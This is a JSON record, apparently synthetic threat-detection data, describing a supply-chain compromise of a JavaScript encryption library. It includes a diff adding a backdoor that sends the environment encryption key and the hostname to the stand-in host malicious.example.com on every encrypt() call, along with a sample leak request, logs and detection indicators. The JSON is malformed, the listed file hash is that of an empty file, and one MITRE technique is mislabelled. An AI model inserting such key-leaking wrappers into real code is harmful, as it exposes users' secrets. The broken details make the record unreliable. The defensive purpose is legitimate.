{
  "scenario": "Malicious code inserted into a widely used open-source software library by a compromised vendor, leading to supply chain infection of downstream applications.",
  "technical_data": {
    "git_commit_diff": "diff --git a/src/utils/encryption.js b/src/utils/encryption.js
index a1b2c3d..d4e5f6a 100644
--- a/src/utils/encryption.js
+++ b/src/utils/encryption.js
@@ -45,6 +45,13 @@ function encrypt(data, key) {
     // Original encryption logic
     return crypto.createCipher('aes-256-cbc', key).update(data, 'utf8', 'hex');
 }
+
+// Malicious backdoor function inserted by attacker
+function leakKey() {
+    const http = require('http');
+    const os = require('os');
+    const key = process.env.ENCRYPTION_KEY || 'default_key';
+    const options = {
+        hostname: 'malicious.example.com',
+        port: 80,
+        path: '/leak?host=' + os.hostname() + '&key=' + key,
+        method: 'GET'
+    };
+    const req = http.request(options);
+    req.end();
+}
+
+// Call backdoor on every encryption
+encrypt = (function(original) {
+    return function(data, key) {
+        leakKey();
+        return original(data, key);
+    }
+})(encrypt);
",
    "sbom_snippet": "{
  "name": "vulnerable-utils",
  "version": "2.1.0",
  "components": [
    {
      "type": "library",
      "name": "crypto",
      "version": "1.0.0",
      "hashes": {
        "sha256": "3a5b1e0c9d3f7c6b05f8a9a2e7f9a0b6f4c3d2e7f8a9b0c1d2e3f4a5b6c7d8e9"
      }
    }
  ]
}",
    "network_http_request": "GET /leak?host=victims-host-123&key=supersecretkey123 HTTP/1.1
Host: malicious.example.com
User-Agent: nodejs-http-client/1.0
Connection: close

",
    "server_log_entry": "Apr 15 14:32:10 victim-host app[1234]: Executed encrypt() with key from env variable.
Apr 15 14:32:10 victim-host nodejs: HTTP GET request sent to malicious.example.com with encryption key leak.",
    "process_tree": "node (pid=1234) -> encryption.js (module) -> leakKey() -> http.request()",
    "hashes": {
      "file": {
        "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
      }
    }
  },
  "indicators": [
    "HTTP GET request to http://malicious.example.com/leak with sensitive query parameters",
    "Unexpected outbound HTTP requests from internal encryption library",
    "Malicious git commit modifying encryption function to exfiltrate keys",
    "SBOM mismatch with vendor-reported hashes",
    "Process tree showing encryption function spawning HTTP requests"
  ],
  "detection_method": "Monitor outbound HTTP requests from internal libraries; verify SBOM hashes against vendor releases; scan code changes for suspicious additions; alert on process spawning unexpected network connections.",
  "relevant_mitre_techniques": [
    "T1195 - Supply Chain Compromise",
    "T1041 - Exfiltration Over C2 Channel",
    "T1071.001 - Web Protocols",
    "T1609 - Container and Resource Discovery"
  ]
